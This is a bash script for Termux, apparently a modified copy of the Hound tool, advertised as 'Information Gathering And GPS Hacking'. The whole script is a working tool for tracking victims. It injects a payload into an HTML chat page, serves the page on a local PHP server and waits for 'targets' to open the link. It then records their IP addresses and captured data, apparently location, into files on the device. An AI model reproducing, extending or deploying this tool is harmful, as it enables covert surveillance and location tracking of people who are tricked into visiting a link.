#!/bin/bash
# RKGH v 1.rk.beta
# Powered by RK Studio
# For More Tool Visit https://github.com/rkstudio585
# CopyRight by Hound

trap 'printf "\n";stop' 2
termux='Termux'
tool_name='RKGH'
host='localhost'
port='8080'
version='\033[31m1.rk.beta\e[0m\e[1;92m'


banner() {
clear
printf '\n\033[36m                      ╦═╗╦╔═╔═╗╦ ╦\e[0m\n'
printf '\033[36m                      ╠╦╝╠╩╗║ ╦╠═╣\e[0m\n'
printf '\033[36m                      ╩╚═╩ ╩╚═╝╩ ╩\e[0m\n\n'
printf '\e[1;33m     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[0m\n'
printf "\e[1;33m     $tool_name\e[0m\e[1;92m Version $version - by RK Riad \e[0m\033[36m[\e[1;33mRK Studio\e[0m\033[36m]\e[0m \n"
printf "\e[1;92m     www.rkstudio.com | www.github.com/rkstudio585 \e[0m \n"
printf "\e[1;33m     $tool_name\e[0m\e[1;92m is Information Gathering And GPS Hacking.\e[0m \n"
printf "\e[1;33m        $tool_name\e[0m\e[1;92m Tool Modified by RK From Hound Tool.\e[0m \n"
printf '\e[1;33m     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[0m\n'
printf "\n"
}

check_status() {
        echo -ne "\e[1;92m[\e[0m+\e[1;92m] Internet Status: "
        timeout 3s curl -fIs "https://api.github.com" > /dev/null
        [ $? -eq 0 ] && echo -e "\e[1;92mOnline\e[0m" && return 0 && check_update || echo -e '\033[0;31mOffline\e[0m' && return 1;
}
run_create() {
    if [ ! -d /sdcard/$termux/ ]; then
        mkdir /sdcard/$termux
    fi
    if [ ! -d /sdcard/$termux/$tool_name/ ]; then
        mkdir /sdcard/$termux/$tool_name
    fi
}

dependencies() {
  if [[ ! $(command -v php) ]]; then
    echo -e "\e[1;92mInstalling PHP....\e[0m"
    pkg install php -y
    echo -e "\e[1;92mPHP Installing successfuly\e[0m"
  fi
}

stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> /sdcard/$termux/$tool_name/ip.cap
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
done
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Local Server Running At: \033[36mhttp://$host:$port\e[0m\n"
php -S localhost:8080 > /dev/null 2>&1 &
printf "\e[1;92m[\e[0m+\e[1;92m] Data Save At: \033[36m/sdcard/$termux/$tool_name\e[0m\n"
printf "\e[1;92m[\e[0m+\e[1;92m] Note:\e[0m ( \033[36mI Remove The Tunneling Features From This Tool\n\t  You Can Start Your Own Tunneling Server\e[0m )\n"
sleep 1
checkfound
}
hound() {
if [[ -e data.txt ]]; then
cat data.txt >> /sdcard/$termux/$tool_name/report.cap
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi
sed -e '/rk_payload/r payload' index_chat.html > index.html
local_server
}

banner
check_status
run_create
dependencies
hound
